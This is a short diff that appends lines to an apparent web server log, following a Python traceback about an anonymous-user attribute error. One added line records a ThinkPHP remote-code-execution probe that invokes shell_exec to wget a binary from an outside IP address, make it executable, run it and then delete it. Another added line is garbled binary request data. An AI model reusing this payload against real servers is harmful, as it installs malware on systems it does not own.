@@ -6722,3 +6722,5 @@ Traceback (most recent call last):
     if current_user.type == "admin" :
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 AttributeError: 'AnonymousUserMixin' object has no attribute 'type'
+143.198.30.131 - - [03/Sep/2024 13:12:57] code 400, message Bad HTTP/0.9 request type ('\x00*8C²\x13G\x86\x15\x82¾î²Iâ/æ\x81Àß£\x82ïÿ¼;rÔVï«\x00\x00\x00\x01f×')
+117.72.15.227 - - [03/Sep/2024 13:21:19] code 400, message Bad request syntax ("GET /index.php?s=/index/\think\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://193.84.71.195/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1")
